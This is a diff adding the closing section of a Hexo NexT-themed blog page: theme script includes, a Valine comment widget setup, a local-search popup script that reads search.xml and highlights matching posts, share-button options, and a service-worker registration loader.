+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'cM9V6UXqe4qtpXHOvQO5eS6R-gzGzoHsz',
+        appKey: 'lzYVPw46IOBJRFvDrn85wuxE',
+        placeholder: '欢迎大家 畅所欲言',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "default";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "default";
+      
+          flOptions.boxForm = "vertical";
+      
+          flOptions.position = "topRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
